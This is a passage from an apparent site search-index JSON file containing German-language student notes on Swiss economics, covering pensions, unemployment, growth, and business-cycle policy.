            "text": "Pflicht f\u00fcr ganze Bev\u00f6lkerung (mit Aufenthaltsbewilligung)  Ziel: Reine Existenzsicherung", 
            "title": "AHV (1. S\u00e4ule)"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#berufliche-vorsorge-pensionskasse", 
            "text": "Haben alle mit Arbeitsstelle in der Schweiz (Pflicht)  70%-80% des Lebensstandards in der Pension  Zwei Optionen: Einmalig ganzes Geld bekommen oder lebenslang einen Betrag (Rente) erhalten  Junge zahlen weniger Prozente als \u00e4ltere  Begr\u00fcndung: \"junge brauche das Geld noch\"  Einer der Hauptgr\u00fcnde, dass \u00e4ltere nur schwieriger einen Job finden (Unternehmen muss mind. H\u00e4lfte \u00fcbernehmen)", 
            "title": "Berufliche Vorsorge (Pensionskasse)"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#selbstvorsoge", 
            "text": "Kann vom steuerbaren Einkommen abgezogen werden  Privates Verm\u00f6gen   freiwillig", 
            "title": "Selbstvorsoge"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#herausforderungen-fur-die-erste-und-zweite-saule", 
            "text": "Herausforderung: Leute w\u00e4ren immer \u00e4lter  AHV geht von einer Pyramide aus: Mehr j\u00fcngere als \u00e4ltere  Geburtenrate ist zu tief (1.6 statt 2.1), Durschnittliches Alter steigt  AHV ist seit 2 Jahren im defizit  Wird momentan durch Fond (28 Mia.) finanziert  Ist aufgebraucht zwischen 2027 und 2033", 
            "title": "Herausforderungen f\u00fcr die erste und zweite S\u00e4ule"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#losungsmoglichkeiten", 
            "text": "Direkt einflussbare Parameter  H\u00f6here Beitr\u00e4ge  Tiefere Renten (ausgeschlossen!1!!!)  Rentenalter erh\u00f6hen     Indirekt beeinflussbar (keine L\u00f6sungen)   Immigration  Geburtenrate  Wirtschaftswachstum     Gesetzliches Rentenalter != durchschnittliches Rentenalter!   z.B in Belgien, Frankreich ist effektives Rentenalter viel tiefer  In Portugal, Japan sehr hohes effektives Alter  Weil wenig Altersvorsorge, keine Wahl    In der Schweiz \"arbeitet man gerne\"  Man kann die Pension um 4 Jahre verz\u00f6gern f\u00fcr h\u00f6here Rente", 
            "title": "L\u00f6sungsm\u00f6glichkeiten"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#probleme-bvg-pensionskasse", 
            "text": "Es gibt einen Mindestzinssatz, die die Pensionskassen bieten m\u00fcssen  2003: 4%, heute 1.75%  Historisch sind Pensionskassen unterdeckt, im letzten Jahr wieder h\u00f6her  Gewerkschaften wollen h\u00f6here Zinss\u00e4tze, Pensionskassen tiefere  Ein Drittel wird auf Obligationen investiert (Negativzinsen!)  Umwandlungssatz: Prozentsatz des angesparten Verm\u00f6ges, der als rente ausbezahlt wird  2005: 7.2% -  Lebenserwartung von ~79  2014: 6.8%  2010: Referendum gegen 6.4% vom Schweizer Volk", 
            "title": "Probleme BVG (Pensionskasse)"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#armut-in-der-schweiz", 
            "text": "Armut nimmt in der Schweiz ab  \"absolut arm\":  Definiert mit u.a. \"Kein Auto, kein Farbfernseher\"  Wenn drei von neun Kategorien erf\u00fcllt", 
            "title": "Armut in der Schweiz"
        }, 
        {
            "location": "/Vwl/3_Einkommensverteilung_und_Sozialwerke/#bedinungsloses-grundeinkommen", 
            "text": "Theoretisch 80-90% finanzierbar  K\u00fcrzen von vielen Sozialleistungen, weil sie jetzt durch BGE gedeckt w\u00e4ren  Mehr als die H\u00e4lfte durch R\u00fcckzahlungen von Arbeitgeber", 
            "title": "Bedinungsloses Grundeinkommen"
        }, 
        {
            "location": "/Vwl/4_Wachstum/", 
            "text": "Langfristiges Wachstum\n\n\nBedeutung des langfristigen Wirtschaftswachstums\n\n\n\n\nZweiter WK hatte langfristig keinen Effekt auf das Wachstum, weder in Japan noch USA\n\n\n1960 - 1980: Japan hat USA aufgeholt, seit 1990 ist l\u00fccke wieder gr\u00f6sser\n\n\n\n\nLangfristiger Wachstumstrend\n\n\n\n\nKonjukturverlauf ist genauer Verlauf, der schwankt\n\n\nWachstumstrend ist durchschnitt \u00fcber einen l\u00e4ngeren Zeitraum\n\n\n\n\nErfolgsfaktoren\n\n\n\n\nProduktivit\u00e4t wird gemessen in BIP / Arbeitsstunden\n\n\nDamit BIP / Kopf w\u00e4chst, muss mehr oder effizienter gearbeitet werden\n\n\nUm Produktivit\u00e4t zu erh\u00f6hen, kann Kapital aufgewendet oder in Technologie investiert werden (technischer Fortschritt)\n\n\nInnovation ist einzige \"unendliche\" Ressource\n\n\nDadurch k\u00f6nnte das Wachstum immer weiter gehen\n\n\n\n\n\n\nWeitere externe Faktoren der Wirtschaftspolitik\n\n\n\n\nWachstum im Vergleich\n\n\n\n\nWachstum in der Schweiz nahm 1970-2000 stark ab\n\n\nSeit 2000 wieder leicht besser\n\n\nAber insgesamt sinkendes Wachstum\n\n\n\n\nGr\u00fcnde\n\n\n\n\nExogene Faktoren\n\n\nKein Seezugang ist ein Nachteil\n\n\nSozialkapital, Klima, Rohstoffe hier kein Problem\n\n\n\n\n\n\nWirtschaftspolitik\n\n\n??\n\n\n\n\n\n\nMehr Arbeitsstunden\n\n\nTiefe Arbeitslosenquote in der Schweiz\n\n\nGrund: Arbeitsmoral, vern\u00fcnftige L\u00f6hne\n\n\nH\u00f6here Quote durch Immigranten\n\n\n\n\n\n\nTechnischer Fortschritt\n\n\nSchweiz einer der innovativsten Standorte weltweit\n\n\nPatentschutz (20 J.) f\u00f6rdert Innovation\n\n\n\n\n\n\nArbeitsproduktivit\u00e4t\n\n\nSchweiz international schlecht aufgestellt, hinter FR, DE, USA\n\n\n1970 war Schweiz das produktivste Land\n\n\n\n\n\n\n\n\nProduktivit\u00e4tsschw\u00e4che der Schweiz\n\n\n\n\nWachstum der Staatsquote\n\n\nStarke Sozialisierung\n\n\n\n\n\n\nImmigration\n\n\nSch\u00e4dlich, wenn nur geringqualifizierte\n\n\nnicht das grosse Problem\n\n\n\n\n\n\n\n\nAbschottung des Binnenmarkts\n\n\n\n\nz.B. Online-Gl\u00fccksspielgesetz\n\n\nRestriktiver Import von z.B. Wein, Fleisch\n\n\n-\n \"Hochpreisinsel\"\n\n\n\n\n\n\n\n\nStaatsquote: Anteil des BIP am \u00f6ffentlichen Konsum und \u00f6ffentliche Bruttoinvestitionen\n\n\n\n\nStaatsquote ist in der Schweiz noch klein im Vergleich, aber w\u00e4chst am schnellsten\n\n\n\n\nEind\u00e4mmung der Staatsquote\n\n\n\n\n2004-2008: Nicht funktioniert\n\n\n2008-2011: 2. Paket mit sehr \u00e4hnlichen Massnahmen, kein Erfolg\n\n\n2012-2015: 3. Plan, wieder die gleichen Massnahmen\n\n\n\n\n2016-2019: 4. Plan\n\n\n\n\n\n\nGrund: Schweizer wollen Unabh\u00e4ngigkeit behalten\n\n\n\n\n\n\nDie Produktivit\u00e4t des Privatsektors steigt, w\u00e4hrend die Produktivit\u00e4t des Staatssektors stark sinkt. Gleichzeitig steigt die Besch\u00e4ftigung des Staates", 
            "title": "4 Wachstum"
        }, 
        {
            "location": "/Vwl/4_Wachstum/#langfristiges-wachstum", 
            "text": "", 
            "title": "Langfristiges Wachstum"
        }, 
        {
            "location": "/Vwl/4_Wachstum/#bedeutung-des-langfristigen-wirtschaftswachstums", 
            "text": "Zweiter WK hatte langfristig keinen Effekt auf das Wachstum, weder in Japan noch USA  1960 - 1980: Japan hat USA aufgeholt, seit 1990 ist l\u00fccke wieder gr\u00f6sser", 
            "title": "Bedeutung des langfristigen Wirtschaftswachstums"
        }, 
        {
            "location": "/Vwl/4_Wachstum/#langfristiger-wachstumstrend", 
            "text": "Konjukturverlauf ist genauer Verlauf, der schwankt  Wachstumstrend ist durchschnitt \u00fcber einen l\u00e4ngeren Zeitraum", 
            "title": "Langfristiger Wachstumstrend"
        }, 
        {
            "location": "/Vwl/4_Wachstum/#erfolgsfaktoren", 
            "text": "Produktivit\u00e4t wird gemessen in BIP / Arbeitsstunden  Damit BIP / Kopf w\u00e4chst, muss mehr oder effizienter gearbeitet werden  Um Produktivit\u00e4t zu erh\u00f6hen, kann Kapital aufgewendet oder in Technologie investiert werden (technischer Fortschritt)  Innovation ist einzige \"unendliche\" Ressource  Dadurch k\u00f6nnte das Wachstum immer weiter gehen    Weitere externe Faktoren der Wirtschaftspolitik", 
            "title": "Erfolgsfaktoren"
        }, 
        {
            "location": "/Vwl/4_Wachstum/#wachstum-im-vergleich", 
            "text": "Wachstum in der Schweiz nahm 1970-2000 stark ab  Seit 2000 wieder leicht besser  Aber insgesamt sinkendes Wachstum", 
            "title": "Wachstum im Vergleich"
        }, 
        {
            "location": "/Vwl/4_Wachstum/#grunde", 
            "text": "Exogene Faktoren  Kein Seezugang ist ein Nachteil  Sozialkapital, Klima, Rohstoffe hier kein Problem    Wirtschaftspolitik  ??    Mehr Arbeitsstunden  Tiefe Arbeitslosenquote in der Schweiz  Grund: Arbeitsmoral, vern\u00fcnftige L\u00f6hne  H\u00f6here Quote durch Immigranten    Technischer Fortschritt  Schweiz einer der innovativsten Standorte weltweit  Patentschutz (20 J.) f\u00f6rdert Innovation    Arbeitsproduktivit\u00e4t  Schweiz international schlecht aufgestellt, hinter FR, DE, USA  1970 war Schweiz das produktivste Land", 
            "title": "Gr\u00fcnde"
        }, 
        {
            "location": "/Vwl/4_Wachstum/#produktivitatsschwache-der-schweiz", 
            "text": "Wachstum der Staatsquote  Starke Sozialisierung    Immigration  Sch\u00e4dlich, wenn nur geringqualifizierte  nicht das grosse Problem     Abschottung des Binnenmarkts   z.B. Online-Gl\u00fccksspielgesetz  Restriktiver Import von z.B. Wein, Fleisch  -  \"Hochpreisinsel\"     Staatsquote: Anteil des BIP am \u00f6ffentlichen Konsum und \u00f6ffentliche Bruttoinvestitionen   Staatsquote ist in der Schweiz noch klein im Vergleich, aber w\u00e4chst am schnellsten", 
            "title": "Produktivit\u00e4tsschw\u00e4che der Schweiz"
        }, 
        {
            "location": "/Vwl/4_Wachstum/#eindammung-der-staatsquote", 
            "text": "2004-2008: Nicht funktioniert  2008-2011: 2. Paket mit sehr \u00e4hnlichen Massnahmen, kein Erfolg  2012-2015: 3. Plan, wieder die gleichen Massnahmen   2016-2019: 4. Plan    Grund: Schweizer wollen Unabh\u00e4ngigkeit behalten    Die Produktivit\u00e4t des Privatsektors steigt, w\u00e4hrend die Produktivit\u00e4t des Staatssektors stark sinkt. Gleichzeitig steigt die Besch\u00e4ftigung des Staates", 
            "title": "Eind\u00e4mmung der Staatsquote"
        }, 
        {
            "location": "/Vwl/5_Arbeitsmarkt/", 
            "text": "Arbeitsmarkt\n\n\nArbeitslosigkeit\n\n\nArbeitslosenquoten\n\n\n\n\nIn der Schweiz konstant tief seit 20 Jahren (heute 3.6%)\n\n\n\n\nDeutschland und USA sind heute deutlich tiefer (ca. 4.6%)\n\n\n\n\n\n\n1970 gab es in der Schweiz fast keine Arbeitslosigkeit\n\n\n\n\nAuch durch \u00d6lpreiskrisen nur kurze Anstiege\n\n\nInner einem Jahr 1991 auf 5% gestiegen\n\n\n\"Sorge\": Trend seit 2001 ist steigend\n\n\n\n\nTypen der Arbeitslosigkeit\n\n\n\n\nSockerarbeitslosigkeit\n: Es h\u00e4tte genug offene Stellen f\u00fcr Arbeitslose (um das geht es hier)\n\n\nKonjukturelle Arbeitslosigkeit\n: Anzahl der Arbeitslosen ist gr\u00f6sser als Anzahl der offenen Stellen\n\n\n\n\nErh\u00f6hung der Sockelarbeitslosigkeit\n\n\n\n\nZwischen 1980 und 1990 hat sich die Sockelarbeitslosigkeit erh\u00f6ht\n\n\nKonjukturelle Arbeitslosigkeit ist vor\u00fcbergehend, Sockelarbeitslosigkeit ist kontinuierlich (nicht einfach wegzubringen)\n\n\n\n\nKenngr\u00f6ssen\n\n\n\n\nErbwerbsbev\u00f6lkerung: Anteil der 15- bis 64-J\u00e4hrige, die arbeiten m\u00f6chten\n\n\nDie \nArbeitslosenquote\n ist der Anteil der Arbeitslosen der Erwerbsbev\u00f6lkerung\n\n\nDie \nErwerbsquote\n ist der Anteil der Erwerbsbev\u00f6lkerung der 15- bis 64- J\u00e4hrige\n\n\nErwerbst\u00e4tigenquote\n ist der Anteil der Besch\u00e4ftigten der 15- bis 64-j\u00e4hrigen\n\n\n\n\nArbeitslosenquote allein ist nicht vergleichbar mit anderen L\u00e4ndern, weil Erwerbst\u00e4tigenquote variiert\n\n\n\n\n\n\nErwerbst\u00e4tigkeit in der Schweiz ist stetig am steigen\n\n\n\n\nImmigration hat einen positiven Einfluss\n\n\n\n\n\n\nErwerbst\u00e4tigenquote ist in der Schweiz im Vergleich sehr hoch\n\n\nz.B. in Italien \"lohnt es sich\" weniger, zu arbeiten\n\n\n\n\n\n\n\n\nDer Arbeitsmarkt als mikro\u00f6konomisches Modell\n\n\n\n\nA-Kurve: Angebot an Arbeit durch die \nHaushalte\n (nicht durch die Unternehmer!)\n\n\nN-Kurve: Nachfrage an Arbeit \ndurch Unternehmen\n\n\nDort, wo sich die Kurven schneiden: Marktgleichgewicht\n\n\nDefiniert den Preis f\u00fcr Arbeit und die Besch\u00e4ftigten-Anzahl\n\n\n\n\n\n\nAlles rechts oben des Punktes f\u00fcr A: Verzichten freiwillig auf eine Stelle, weil sie zu hohe Lohnerwartungen haben\n\n\nAst rechts Unten der N-Kurve repr\u00e4sentieren Unternehmen, die Leute einstellen m\u00f6chten zu einem zu tiefen Lohn, und finden somit niemanden\n\n\nAlle links vom Schnittpunkt haben Stellen\n\n\nWenn weniger Arbeitskr\u00e4fte ben\u00f6tigt werden, verschiebt sich N-Kurve nach links -\n Marktlohn und Anzahl Besch\u00e4ftigte werden geringer\n\n\nAlle, die zu tieferem Lohn arbeiten wollen, haben eine Stelle. Andere verzichten freiwillig -\n Arbeitslosenquote \u00e4ndert sich nicht\n\n\n\n\n\n\nWenn Lohn fixiert wird (Mindestlohn) gibt es q1, die eine Stelle suchen, aber das Angebot bleibt gleich -\n F\u00fchrt zu Arbeitslosigkeit\n\n\nMindestlohn \u00fcber dem Marktlohn f\u00fchrt immer zu (Sockel-)Arbeitslosigkeit. Nur wie viel? -\n Diskussion um Mindestlohn\n\n\nMindestlohn \u00fcber ganze Wirtschaft ist gef\u00e4hrlich\n\n\nIn der Schweiz gibt es in spezifischen Branchen Mindestl\u00f6hne\n\n\nIn GAVs festgelegt\n\n\nOptionale Abmachung zwischen Arbeitnehmer und Arbeitgeber\n\n\nWin-Win f\u00fcr beide\n\n\n\n\n\n\n\n\nArbeitsmarkt in der Schweiz\n\n\n\n\nEs ist im weltweiten Vergleich sehr einfach, jemanden zu entlassen\n\n\nF\u00fchrt zu unbefristeten Stellen\n\n\n\n\n\n\nSchweiz hat einer der liberalsten Arbeitsm\u00e4rkte der Welt\n\n\n\"Hiring and Firing\" ist weniger reguliert als in der USA\n\n\n\n\n\n\nAber: Sockelarbeitslosigkeit nimmt seit 2000 zu\n\n\n\n\nGrund Anstieg Arbeitslosenquote 1990er\n\n\n\n\nVerst\u00e4rkte Einbindung von Frauen\n\n\nMehr Ausl\u00e4nder mit langfristigen Aufenthaltsbewilligung\n\n\nAttraktivere Arbeitslosenversicherung\n\n\nGleichzeitig sank die Nachfrage nach Arbeitnehmer\n\n\nRezession der Wirtschaft", 
            "title": "5 Arbeitsmarkt"
        }, 
        {
            "location": "/Vwl/5_Arbeitsmarkt/#arbeitsmarkt", 
            "text": "", 
            "title": "Arbeitsmarkt"
        }, 
        {
            "location": "/Vwl/5_Arbeitsmarkt/#arbeitslosigkeit", 
            "text": "", 
            "title": "Arbeitslosigkeit"
        }, 
        {
            "location": "/Vwl/5_Arbeitsmarkt/#arbeitslosenquoten", 
            "text": "In der Schweiz konstant tief seit 20 Jahren (heute 3.6%)   Deutschland und USA sind heute deutlich tiefer (ca. 4.6%)    1970 gab es in der Schweiz fast keine Arbeitslosigkeit   Auch durch \u00d6lpreiskrisen nur kurze Anstiege  Inner einem Jahr 1991 auf 5% gestiegen  \"Sorge\": Trend seit 2001 ist steigend", 
            "title": "Arbeitslosenquoten"
        }, 
        {
            "location": "/Vwl/5_Arbeitsmarkt/#typen-der-arbeitslosigkeit", 
            "text": "Sockerarbeitslosigkeit : Es h\u00e4tte genug offene Stellen f\u00fcr Arbeitslose (um das geht es hier)  Konjukturelle Arbeitslosigkeit : Anzahl der Arbeitslosen ist gr\u00f6sser als Anzahl der offenen Stellen", 
            "title": "Typen der Arbeitslosigkeit"
        }, 
        {
            "location": "/Vwl/5_Arbeitsmarkt/#erhohung-der-sockelarbeitslosigkeit", 
            "text": "Zwischen 1980 und 1990 hat sich die Sockelarbeitslosigkeit erh\u00f6ht  Konjukturelle Arbeitslosigkeit ist vor\u00fcbergehend, Sockelarbeitslosigkeit ist kontinuierlich (nicht einfach wegzubringen)", 
            "title": "Erh\u00f6hung der Sockelarbeitslosigkeit"
        }, 
        {
            "location": "/Vwl/5_Arbeitsmarkt/#kenngrossen", 
            "text": "Erbwerbsbev\u00f6lkerung: Anteil der 15- bis 64-J\u00e4hrige, die arbeiten m\u00f6chten  Die  Arbeitslosenquote  ist der Anteil der Arbeitslosen der Erwerbsbev\u00f6lkerung  Die  Erwerbsquote  ist der Anteil der Erwerbsbev\u00f6lkerung der 15- bis 64- J\u00e4hrige  Erwerbst\u00e4tigenquote  ist der Anteil der Besch\u00e4ftigten der 15- bis 64-j\u00e4hrigen   Arbeitslosenquote allein ist nicht vergleichbar mit anderen L\u00e4ndern, weil Erwerbst\u00e4tigenquote variiert    Erwerbst\u00e4tigkeit in der Schweiz ist stetig am steigen   Immigration hat einen positiven Einfluss    Erwerbst\u00e4tigenquote ist in der Schweiz im Vergleich sehr hoch  z.B. in Italien \"lohnt es sich\" weniger, zu arbeiten", 
            "title": "Kenngr\u00f6ssen"
        }, 
        {
            "location": "/Vwl/5_Arbeitsmarkt/#der-arbeitsmarkt-als-mikrookonomisches-modell", 
            "text": "A-Kurve: Angebot an Arbeit durch die  Haushalte  (nicht durch die Unternehmer!)  N-Kurve: Nachfrage an Arbeit  durch Unternehmen  Dort, wo sich die Kurven schneiden: Marktgleichgewicht  Definiert den Preis f\u00fcr Arbeit und die Besch\u00e4ftigten-Anzahl    Alles rechts oben des Punktes f\u00fcr A: Verzichten freiwillig auf eine Stelle, weil sie zu hohe Lohnerwartungen haben  Ast rechts Unten der N-Kurve repr\u00e4sentieren Unternehmen, die Leute einstellen m\u00f6chten zu einem zu tiefen Lohn, und finden somit niemanden  Alle links vom Schnittpunkt haben Stellen  Wenn weniger Arbeitskr\u00e4fte ben\u00f6tigt werden, verschiebt sich N-Kurve nach links -  Marktlohn und Anzahl Besch\u00e4ftigte werden geringer  Alle, die zu tieferem Lohn arbeiten wollen, haben eine Stelle. Andere verzichten freiwillig -  Arbeitslosenquote \u00e4ndert sich nicht    Wenn Lohn fixiert wird (Mindestlohn) gibt es q1, die eine Stelle suchen, aber das Angebot bleibt gleich -  F\u00fchrt zu Arbeitslosigkeit  Mindestlohn \u00fcber dem Marktlohn f\u00fchrt immer zu (Sockel-)Arbeitslosigkeit. Nur wie viel? -  Diskussion um Mindestlohn  Mindestlohn \u00fcber ganze Wirtschaft ist gef\u00e4hrlich  In der Schweiz gibt es in spezifischen Branchen Mindestl\u00f6hne  In GAVs festgelegt  Optionale Abmachung zwischen Arbeitnehmer und Arbeitgeber  Win-Win f\u00fcr beide", 
            "title": "Der Arbeitsmarkt als mikro\u00f6konomisches Modell"
        }, 
        {
            "location": "/Vwl/5_Arbeitsmarkt/#arbeitsmarkt-in-der-schweiz", 
            "text": "Es ist im weltweiten Vergleich sehr einfach, jemanden zu entlassen  F\u00fchrt zu unbefristeten Stellen    Schweiz hat einer der liberalsten Arbeitsm\u00e4rkte der Welt  \"Hiring and Firing\" ist weniger reguliert als in der USA    Aber: Sockelarbeitslosigkeit nimmt seit 2000 zu", 
            "title": "Arbeitsmarkt in der Schweiz"
        }, 
        {
            "location": "/Vwl/5_Arbeitsmarkt/#grund-anstieg-arbeitslosenquote-1990er", 
            "text": "Verst\u00e4rkte Einbindung von Frauen  Mehr Ausl\u00e4nder mit langfristigen Aufenthaltsbewilligung  Attraktivere Arbeitslosenversicherung  Gleichzeitig sank die Nachfrage nach Arbeitnehmer  Rezession der Wirtschaft", 
            "title": "Grund Anstieg Arbeitslosenquote 1990er"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/", 
            "text": "Konjuktur\n\n\nNachfrage- und Angebotsschock\n\n\nNegativer Nachfrageschock:\n\n\n\n\nAnfrage-Kurve wird nach links verschoben\n\n\nUrsache (Bsp.): \n\n\nKonsum der Haushalte bricht ein\n\n\nStaat muss sparen\n\n\nUnternehmen investieren weniger\n\n\nAusland sinkt Nachfrage\n\n\n\n\n\n\nReales BIP geht zur\u00fcck\n\n\nDas Preisniveau sinkt\n\n\nKaufkraft steigt (wenn L\u00f6hne gleich bleiben)\n\n\n\n\n\n\nAuswirkungen:\n\n\nWeniger Arbeitspl\u00e4tze\n\n\nUnternehmen k\u00f6nnen weniger herstellen\n\n\nSchlecht f\u00fcr Importe und Exporte\n\n\n-\n Schlimmer f\u00fcr Unternehmen als f\u00fcr Haushalte\n\n\n\n\n\n\n\n\nPositiver Nachfrageschock\n\n\n\n\nGut f\u00fcr Haushalte bez\u00fcglich Arbeitspl\u00e4tze, aber weniger Kaufkraft\n\n\nGut f\u00fcr Unternehmen, es wird mehr hergestellt\n\n\nPositive Nachfrage auf lange Sicht f\u00fchrt zu Inflation, weil die Kapazit\u00e4tsgrenze gleich bleibt\n\n\n\n\nNegativer Angebotsschock\n\n\n\n\nAngebotskurve nach links verschoben\n\n\nUrsache\n\n\nRohstoffe werden knapp\n\n\n(Mindestlohn)\n\n\nMehr Steuern f\u00fcr Unternehmen\n\n\n\n\n\n\nAuswirkung\n\n\nWeniger BIP\n\n\nPreissteigerung kann f\u00fcr Unternehmen positiv sein\n\n\nF\u00fcr Haushalte: Gef\u00e4hrdung der Arbeitsstelle, h\u00f6here Preise\n\n\n\n\n\n\n\n\nPositiver Angebotsschock\n\n\n\n\nGut f\u00fcr Haushalte, tiefere Preise, sicherer Arbeitsplatz\n\n\nUnternehmen k\u00f6nnen mehr produzieren, aber zu tieferem Preis verkaufen\n\n\n\n\nFazit\n\n\n\n\nNicht jede konjukturelle Ver\u00e4nderung ist f\u00fcr alle Positiv oder Negativ\n\n\nMacht Analysen komplex\n\n\n\n\nKonjukturzyklen\n\n\n\n\nVor 2. WK war Wirtschaft in \"nat\u00fcrlichem\" Zyklus im Gegenuhrzeigersinn\n\n\nNach 2. WK bewegt sich der Zyklus nur noch im inflation\u00e4ren Bereich\n\n\nZentralbanken wollen Deflation verhindern\n\n\nDeflation f\u00fchrt zu weniger Investitionen und sie werden mehr hinaus gez\u00f6gert\n\n\nJapan ist in dieser Situation (\"Deflationsfalle\")\n\n\n\n\nKonjukturpolitik\n\n\n\n\nIn der Schweiz muss der Bund Konjukturpolitik betreiben (Gegen Marktwirtschaft)\n\n\n\n\n\n\n\n\nNichts tun: M\u00e4rkten sollen sich selbst regulieren.\n- Nachfrage nach Arbeit sinkt\n- L\u00f6hne m\u00fcssten kleiner werden\n- Davon profitieren Unternehmen, Angebot geht hinauf bis zur Balance\n- Preisniveau ist gesunken, aber L\u00f6hne auch -\n gleiche Kaufkraft\n- \nProblem\n: Arbeitsm\u00e4rkte ist reguliert, L\u00f6hne d\u00fcrfen nicht sinken. Funktioniert in der Praxis also nicht\n\n\n\n\n\n\nAktive Konjukturpolitik: Der Staat f\u00f6rdert die Nachfrage\n- Arbeitsm\u00e4rkte sind reguliert\n- Nachfrage-Kurve muss wieder nach rechts verschoben werden\n- Haushalte m\u00fcssen mehr Konsumieren oder Unternehmen mehr investieren\n- Weniger Steuern, weniger Zinsen f\u00fcr Haushalte\n- Wenn Staat Konjukturpolitik macht, ist es \"Fiskalpolitik\"\n- Wenn es die Zentralbank macht, \"Geldpolitik\"\n\n\n\n\n\n\nSt\u00e4rkung der automatischen Stabilisatoren: Staatliche Einnahmen und Ausgaben, damit bei R\u00fcckgang der Nachfrage diese automatisch stimuliert wird\n- Bremsung durch progressives Steursystem (Steuereinnahmen steigen exponentiell bei h\u00f6heren Einkommen)\n\n\n\n\n\n\nKritik aktive Konjukturpolitik\n\n\n\n\nRezession: Wenn BIP 2 Quartale hintereinander negativ ist\n\n\nVerz\u00f6gerung ist also mindestens 3 Quartale\n\n\nF\u00fcr Konjukturpaket muss Parlament entscheiden\n\n\nGeht mit allem etwa 5 Jahre\n\n\n\n\n\n\nVerz\u00f6gerung l\u00e4uft Gefahr, dass Korrektur kommt, wenn Hochkonjuktur herrscht\n\n\nDurch f\u00f6deralistischem Prinzip haben Kantone viel Macht\n\n\nSteuern sind auf Bundesebene viel tiefer als auf Kantonalebene!\n\n\n\n\n\n\n\n\nKantone m\u00fcssten mitziehen\n\n\n\n\n\n\nDarum\n: In der Schweiz wird vorallem mit Stabilisatoren gearbeitet\n\n\n\n\nIn der Vergangenheit hat aktive Konjukturpolitik in der Schweiz schlecht funktioniert\n\n\nAuf z.B. Ebene Europa machht es mehr Sinn, weil Rezessionen \u00fcber viele Jahre gehen\n\n\n\n\nKonkukturpolitik 2008-2010\n\n\n\n\nLetzte Krise 2008 ging die Rezession 3 Quartale lang\n\n\nKonjukturpaket aufgrund von Druck\n\n\nErste Stufe 2009\n\n\nDer Bund und die Baubranche hat vorallem profitiert\n\n\n\n\n\n\nZweite Stufe 2009\n\n\nSchiene, Strasse, Infrastruktur\n\n\nHat erst viel sp\u00e4ter Wirkung\n\n\nWieder Vorteile f\u00fcr Baubranche\n\n\n\n\n\n\nDritte Stufe 2010\n\n\nBek\u00e4mpfung Arbeitslosigkeit\n\n\nKurzarbeit: Teil des Lohnes wird vom Staat \u00fcbernommen\n\n\nUnternehmen entlassen weniger Arbeiter und k\u00f6nnen so Rezession ausharren\n\n\nGut f\u00fcr Arbeitgeber und Arbeitnehmer\n\n\n\n\n\n\nFr\u00fchzeitige R\u00fcckverteilung CO2-Abgabe, wird sowieso jedes Jahr gemacht und hat nichts mit Konjukturpolitik zu tun\n\n\n\n\n\n\n\n\nFazit\n\n\n\n\nWar nicht \"timely\", da Einf\u00fchrung viel zu sp\u00e4t\n\n\nNicht \"targeted\", vorallem Staat und Baubranche hat profitiert\n\n\nNicht \"temporarly\": Gelder wurden bis 2015 ausgegeben\n\n\nGesamtpaket 2.1 Milliarden Fr. auf 550 Mrd. BIP - Wenig Einfluss\n\n\n\"Placebo\"-Wirkung, auf Druck der Wirtschaft\n\n\nAls Vergleich haben Kantone und Gemeinde zusammen Konjuktur-Pakete von \n5 Mrd.\n beschlossen\n\n\nInsgesamt war der Einfluss 0.6% des BIPs -\n sehr wenig", 
            "title": "6 Konjuktur"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#konjuktur", 
            "text": "", 
            "title": "Konjuktur"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#nachfrage-und-angebotsschock", 
            "text": "", 
            "title": "Nachfrage- und Angebotsschock"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#negativer-nachfrageschock", 
            "text": "Anfrage-Kurve wird nach links verschoben  Ursache (Bsp.):   Konsum der Haushalte bricht ein  Staat muss sparen  Unternehmen investieren weniger  Ausland sinkt Nachfrage    Reales BIP geht zur\u00fcck  Das Preisniveau sinkt  Kaufkraft steigt (wenn L\u00f6hne gleich bleiben)    Auswirkungen:  Weniger Arbeitspl\u00e4tze  Unternehmen k\u00f6nnen weniger herstellen  Schlecht f\u00fcr Importe und Exporte  -  Schlimmer f\u00fcr Unternehmen als f\u00fcr Haushalte", 
            "title": "Negativer Nachfrageschock:"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#positiver-nachfrageschock", 
            "text": "Gut f\u00fcr Haushalte bez\u00fcglich Arbeitspl\u00e4tze, aber weniger Kaufkraft  Gut f\u00fcr Unternehmen, es wird mehr hergestellt  Positive Nachfrage auf lange Sicht f\u00fchrt zu Inflation, weil die Kapazit\u00e4tsgrenze gleich bleibt", 
            "title": "Positiver Nachfrageschock"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#negativer-angebotsschock", 
            "text": "Angebotskurve nach links verschoben  Ursache  Rohstoffe werden knapp  (Mindestlohn)  Mehr Steuern f\u00fcr Unternehmen    Auswirkung  Weniger BIP  Preissteigerung kann f\u00fcr Unternehmen positiv sein  F\u00fcr Haushalte: Gef\u00e4hrdung der Arbeitsstelle, h\u00f6here Preise", 
            "title": "Negativer Angebotsschock"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#positiver-angebotsschock", 
            "text": "Gut f\u00fcr Haushalte, tiefere Preise, sicherer Arbeitsplatz  Unternehmen k\u00f6nnen mehr produzieren, aber zu tieferem Preis verkaufen", 
            "title": "Positiver Angebotsschock"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#fazit", 
            "text": "Nicht jede konjukturelle Ver\u00e4nderung ist f\u00fcr alle Positiv oder Negativ  Macht Analysen komplex", 
            "title": "Fazit"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#konjukturzyklen", 
            "text": "Vor 2. WK war Wirtschaft in \"nat\u00fcrlichem\" Zyklus im Gegenuhrzeigersinn  Nach 2. WK bewegt sich der Zyklus nur noch im inflation\u00e4ren Bereich  Zentralbanken wollen Deflation verhindern  Deflation f\u00fchrt zu weniger Investitionen und sie werden mehr hinaus gez\u00f6gert  Japan ist in dieser Situation (\"Deflationsfalle\")", 
